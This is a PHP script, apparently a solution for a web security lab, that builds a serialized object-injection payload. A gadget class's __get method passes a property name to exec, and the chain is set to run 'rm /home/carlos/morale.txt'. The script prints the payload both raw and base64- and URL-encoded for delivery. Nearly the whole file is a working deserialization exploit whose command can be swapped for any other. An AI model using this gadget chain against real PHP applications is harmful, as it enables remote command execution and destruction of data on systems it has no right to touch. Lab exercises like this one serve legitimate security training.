<?php
// require_once 'CustomTemplate.php';

class CustomTemplate {
    private $default_desc_type;
    private $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc;
        $this->default_desc_type = $default_desc_type;
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$callback = 'exec';
$command = "rm /home/carlos/morale.txt";

$defaultMap = new DefaultMap($callback);
$customTemplate = new CustomTemplate($command, $defaultMap);
$ser = serialize($customTemplate);
echo($ser . "\n");

echo("===================================================\n");
echo("base64 endcoded then urlencoded: \n");
echo(urlencode(base64_encode($ser)) . "\n");
// echo $default_map->$sayHello_2 . "\n"; 
?>